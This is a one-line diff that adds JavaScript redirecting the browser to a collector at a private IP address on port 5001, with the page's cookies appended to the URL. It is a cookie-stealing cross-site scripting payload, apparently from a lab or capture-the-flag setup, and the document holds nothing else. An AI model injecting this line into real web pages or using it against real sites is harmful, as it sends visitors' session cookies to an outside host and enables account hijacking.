@@ -1,0 +1,1 @@
+document.location='http://192.168.219.130:5001/?c=' + document.cookie;
